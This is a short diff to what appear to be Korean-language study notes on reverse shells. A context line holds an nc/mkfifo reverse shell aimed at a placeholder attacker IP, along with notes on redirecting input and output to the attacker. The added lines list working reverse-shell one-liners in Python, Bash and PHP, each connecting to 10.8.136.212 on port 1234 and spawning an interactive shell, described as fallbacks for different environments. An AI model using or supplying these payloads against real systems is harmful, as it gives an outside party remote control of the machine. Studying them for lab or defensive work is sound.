@@ -63,3 +63,13 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc [ATTACKER_IP] 4444 >/t
 - `>&`는 `2>&1`의 간단 표기법 (Bash 전용)
 - 리버스 셸에서 표준 입출력/에러를 모두 공격자에게 전달해야 완전한 양방향 통신 가능
 - 복잡한 리디렉션은 공격자와의 완전한 셸 통신을 위해 필수
+
+언어/명령,명령어 (COMMAND)
+
+# 환경에 따라 bash, nc, python, php 설치 여부가 다르므로 항상 된다는 보장이 없음 -> 다양한 RS 준비
+
+```sh
+Python,"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'"
+Bash,bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
+PHP,"php -r '$sock=fsockopen(""10.8.136.212"",1234);exec(""/bin/sh -i <&3 >&3 2>&3"");'"
+```
